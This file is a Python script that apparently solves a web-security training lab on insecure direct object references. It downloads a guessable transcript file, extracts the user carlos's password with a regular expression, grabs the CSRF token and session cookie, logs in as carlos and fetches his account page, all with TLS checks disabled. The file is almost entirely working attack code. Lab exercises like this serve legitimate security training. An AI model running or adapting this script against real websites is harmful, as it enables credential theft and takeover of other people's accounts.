import requests
import urllib3
import re
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Insecure direct object references"


def run(url, payload, proxies=None):
    url = url.rstrip('/')

    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Fetch 1.txt log file\n2. Extract carlos password from the log file\n3. Fetch the login page to get a valid session and the csrf token\n4. Login as carlos\n""")

    print(Fore.WHITE + "[1] Fetching the 1.txt log file")
    log_file = requests.get(
        f"{url}/download-transcript/1.txt", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[2] Extracting password from the log file")
    carlos_password = re.findall(r"password is (.*)\.", log_file.text)[0]
    print(Fore.GREEN + "Carlos password" + Fore.WHITE +
          " => " + Fore.YELLOW + carlos_password)

    print(Fore.WHITE +
          "[3] Fetching the login page to get a valid session and the csrf token")

    login_page = requests.get(
        f"{url}/login", verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE +
          "[4] Logging in as carlos")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]
    data = {"username": "carlos",
            "password": carlos_password, "csrf": csrf_token}
    session = login_page.cookies.get("session")
    cookies = {"session": session}

    login_as_carlos = requests.post(
        f"{url}/login", data=data, cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)

    print(Fore.WHITE + "[5] Fetching carlos profile")
    carlos_session = login_as_carlos.cookies.get("session")
    cookies = {"session": carlos_session}
    try:
        r = requests.get(
            f"{url}/my-account", cookies=cookies, verify=False, allow_redirects=False, proxies=proxies)
        return True

    except Exception as e:
        print(f"[!] Failed to fetch payload through exception")
        return False
